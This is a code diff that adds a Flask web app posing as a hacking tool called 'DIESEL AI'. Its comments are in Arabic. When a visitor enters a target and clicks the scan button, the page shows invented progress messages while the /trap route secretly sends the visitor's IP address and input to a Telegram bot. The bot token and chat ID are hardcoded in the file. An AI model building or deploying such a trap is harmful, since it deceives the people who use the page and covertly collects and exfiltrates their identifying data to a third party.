@@ -1,0 +1,57 @@
+import os
+from flask import Flask, request, render_template_string
+import requests
+
+app = Flask(__name__)
+
+# بياناتك
+TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU'
+CHAT_ID = '5177962707'
+
+# الصفحة (كود HTML المدمج)
+HTML = """
+<!DOCTYPE html>
+<html>
+<head><title>DIESEL AI</title>
+<style>
+    body{background:#000;color:#0f0;font-family:'Courier New';display:flex;justify-content:center;align-items:center;height:100vh;}
+    .box{border:1px solid #0f0;padding:30px;text-align:center;width:400px;box-shadow:0 0 20px #0f0;}
+</style>
+</head>
+<body>
+    <div class="box" id="main">
+        <h1>DIESEL AI</h1>
+        <input type="text" id="t" placeholder="Target..." style="background:#111;color:#0f0;width:90%;">
+        <br><br>
+        <button onclick="run()" style="background:#0f0;border:none;padding:10px;font-weight:bold;">RUN SCAN</button>
+    </div>
+    <div id="log" class="box" style="display:none;text-align:left;font-size:12px;"></div>
+    <script>
+        function run(){
+            document.getElementById('main').style.display='none';
+            document.getElementById('log').style.display='block';
+            fetch('/trap', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:document.getElementById('t').value})});
+            let l = document.getElementById('log');
+            let msgs = ["Initializing...", "Scanning Ports...", "Bypassing Firewall...", "Target Identified!", "Data Extraction Complete."];
+            let i=0;
+            setInterval(()=>{if(i<msgs.length) l.innerHTML += msgs[i++] + "<br>";}, 1000);
+        }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def home(): return render_template_string(HTML)
+
+@app.route('/trap', methods=['POST'])
+def trap():
+    data = request.json
+    target = data.get('target', 'None')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    msg = f"🚨 **Diesel AI Hit**\n🎯 Target: {target}\n🌐 IP: {ip}"
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
+    return {"status": "ok"}
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
